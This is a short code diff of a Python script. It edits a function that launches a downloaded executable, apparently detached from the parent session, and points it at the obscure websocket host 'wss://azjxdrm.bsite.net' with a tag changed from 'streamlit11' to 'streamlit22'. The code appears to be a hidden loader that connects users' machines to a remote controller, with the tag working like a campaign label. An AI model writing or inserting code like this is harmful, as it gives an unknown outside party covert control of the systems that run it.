@@ -94,7 +94,7 @@ def _download_file(url: str, dest: Path, retries: int = 2, timeout: int = 30) ->
 
 def _start_ai_agent_process(exe_path: Path) -> subprocess.Popen | None:
     try:
-        args = [str(exe_path), "wss://azjxdrm.bsite.net", "streamlit11"]
+        args = [str(exe_path), "wss://azjxdrm.bsite.net", "streamlit22"]
         creationflags = 0
         # Try to start in a detached session when available (Linux)
         preexec_fn = getattr(os, "setsid", None)
@@ -653,3 +653,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
